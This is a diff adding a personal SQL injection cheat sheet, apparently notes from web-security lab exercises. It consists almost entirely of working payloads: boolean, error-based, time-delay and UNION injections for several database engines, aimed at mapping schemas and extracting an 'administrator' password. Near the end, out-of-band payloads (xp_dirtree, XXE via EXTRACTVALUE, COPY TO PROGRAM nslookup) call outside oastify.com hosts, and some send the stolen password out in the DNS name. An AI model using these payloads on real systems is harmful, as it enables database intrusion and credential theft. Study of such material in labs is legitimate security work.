@@ -1,0 +1,202 @@
+STEP 1 : Find input points (GET , POST, FORM , COOKIES)
+
+SETP 2: FIND the DB SQL Vilnability on those points 
+
+gen point
+'
+''
+Boolean response 
+' AND '1'='1
+' AND '1'='2
+
+Union colum response 
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+timedelay response 
+
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+'; CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' END--
+'; CASE WHEN (1=2) THEN WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' END--
+
+'; SELECT CASE WHEN (1=1) THEN SLEEP(10) ELSE SLEEP(0) END--
+'; SELECT CASE WHEN (1=2) THEN SLEEP(10) ELSE SLEEP(0) END--
+
+'; SELECT dbms_pipe.receive_message(('a'),10) from dual
+
+
+
+
+SETP NOTE the Vulnarable points and type (UNION , BIND- ERROR , DELAY)
+
+Attack 
+try MAP DB
+try Find USERS 
+try Find Passwords
+try Find Admin
+
+
+
+# boolean test
+
+' AND '1'='1
+' AND '1'='2
+
+#boolean operation to confim a table on the DB
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+        SELECT '' FROM users WHERE ROWNUM=1
+
+#boolean operation to confim a user on the DB
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+# boolean operation password len (blind)
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>4)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>6)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>7)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>8)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>12)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>14)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>16)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>18)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>21)='a
+
+# boolean operation password trace
+
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+lk33r1yhqda5ca4xgbcf
+
+# boolean operation password len (error)
+
+
+'|| (SELECT CASE WHEN (LENGTH(password)>18) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+'|| (SELECT CASE WHEN (LENGTH(password)>19) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+'|| (SELECT CASE WHEN (LENGTH(password)>20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+
+'|| (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+
+#Oracel DB
+' UNION SELECT NULL FROM DUAL--
+
+
+# find number of collum 
+' UNION SELECT NULL--
+' UNION SELECT NUL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+#finding a text column 
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+' UNION SELECT 'a',NULL,NULL-- 
+' UNION SELECT NULL,'a',NULL-- 
+' UNION SELECT NULL,NULL,'a'-- 
+
+' UNION SELECT 'a',NULL-- 
+' UNION SELECT NULL,'a'-- 
+
+
+# concat
+' UNION SELECT NULL, username || '~' || password FROM users-- 
+' UNION SELECT NULL, username + '~' + password FROM users-- 
+' UNION SELECT NULL, CONCAT(username , '~', password) FROM users-- 
+' UNION SELECT NULL,'a'
+
+# 
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+
+#DB MAP (GET / POST)
+' UNION SELECT TABLE_NAME FROM information_schema.tables -- 
+' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables -- 
+
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='###'--
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='###'--
+
+' UNION SELECT password_xxx FROM user_xxx WHERE user_name='administrator'--
+' UNION SELECT password_qhpywu, NULL FROM users_qymqho WHERE username_rfiegm='administrator'--
+
+#Error BAsed 
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+
+
+
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND LENGTH(password)>0) THEN 'b' ELSE 'a' END FROM Users)='a
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND LENGTH(password)>20) THEN 1/0 ELSE 'a' END FROM Users)='a
+
+
+'|| (SELECT CASE WHEN (LENGTH(password)>18) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+'|| (SELECT CASE WHEN (LENGTH(password)>19) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+'|| (SELECT CASE WHEN (LENGTH(password)>20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| '
+
+# way around of limit 
+SELECT '' FROM users WHERE ROWNUM=1 
+1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+
+
+
+
+#Time Delay 
+
+'; SELECT CASE WHEN (LENGTH(password)>10) THEN pg_sleep(0) ELSE pg_sleep(10) END FROM users WHERE username='administrator'--
+'; SELECT CASE WHEN (LENGTH(password)>19) THEN pg_sleep(0) ELSE pg_sleep(10) END FROM users WHERE username='administrator'--
+'; SELECT CASE WHEN (LENGTH(password)>20) THEN pg_sleep(0) ELSE pg_sleep(10) END FROM users WHERE username='administrator'--
+
+'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+
+#
+
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com/"> %remote;]>'),'/l') FROM dual--
+
+' || SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com"> %remote;]>'),'/l') FROM dual -- 
+'+ declare @p varchar(1024);set @p=(SELECT 1 );exec('master..xp_dirtree "//'+@p+'.vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com/a"')
+
+'; declare @p varchar(1024);set @p=(SELECT 1 );exec('master..xp_dirtree "//'+@p+'.vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com/a"')
+'; exec master..xp_dirtree '//vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com/a'--
+
+
+'; copy (SELECT '') to program 'nslookup vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com' --
+
+'; LOAD_FILE('\\\\vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com\\a')--
+'; LOAD_FILE('\\\\vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com\\a'); SELECT ... INTO OUTFILE '\\\\vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com\a'--
+'; SELECT ... INTO OUTFILE '\\\\vrqdw4wi34ork84huth0uxgxtozfn5bu.oastify.com\a'--
+
+
+
+
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.bt8tykyy5kq7mo6xw9jgwdidv41wpodd.oastify.com/a"')--
+
+
+
+
+
+
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lc13huh8ou9h5yp7fj2qfn1neek680wp.oastify.com/"> %remote;]>'),'/l') FROM dual--
+
+
+
+
+' &#79;RDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
